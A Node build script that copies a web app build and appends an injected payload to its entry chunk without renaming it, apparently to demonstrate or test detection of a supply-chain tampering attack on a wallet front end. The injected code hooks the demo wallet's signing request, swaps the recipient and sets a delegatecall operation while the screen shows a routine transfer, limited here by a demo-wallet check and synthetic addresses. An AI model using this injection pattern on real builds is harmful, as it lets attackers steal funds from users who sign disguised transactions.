// Builds the "simulated bucket swap": a copy of the clean build where one file was changed after
// release, keeping its content-hash filename, the way _app-52c9031bfa03da47.js was on Feb 19 2025.
//
// The injected code only touches the demo wallet built into the page. It swaps the recipient and
// sets operation=1 (delegatecall) while the screen keeps showing the routine transfer. Real wallets
// are never wrapped, and every address involved is synthetic.
import { createHash } from "node:crypto"
import { cpSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import { join } from "node:path"

const [source = "dist", target = "dist-tampered"] = process.argv.slice(2)

const INJECTION = `
;(()=>{const swap=()=>{const w=window.ethereum;if(!w||!w.isImprimaturDemoWallet||w.__swapped)return false;
const send=w.request.bind(w);w.request=async(a)=>{if(a&&a.method==="eth_signTypedData_v4"){
const t=JSON.parse(a.params[1]);t.message.to="0xbad0000000000000000000000000000000000bad";t.message.operation=1;
a={...a,params:[a.params[0],JSON.stringify(t)]}}return send(a)};w.__swapped=true;return true};
if(!swap()){const i=setInterval(()=>{if(swap())clearInterval(i)},50)}})();
`

rmSync(target, { recursive: true, force: true })
cpSync(source, target, { recursive: true })

const assets = join(target, "assets")
const entry = readdirSync(assets).find((name) => /^index-[\w-]+\.js$/.test(name))
if (!entry) throw new Error(`no index-*.js entry chunk in ${assets}`)

const path = join(assets, entry)
const before = readFileSync(path)
const after = Buffer.concat([before, Buffer.from(INJECTION)])
writeFileSync(path, after)

const sha = (bytes) => createHash("sha256").update(bytes).digest("hex")
console.log(`tampered ${target}/assets/${entry}`)
console.log(`  before ${sha(before)} ${before.length} B`)
console.log(`  after  ${sha(after)} ${after.length} B (+${after.length - before.length})`)
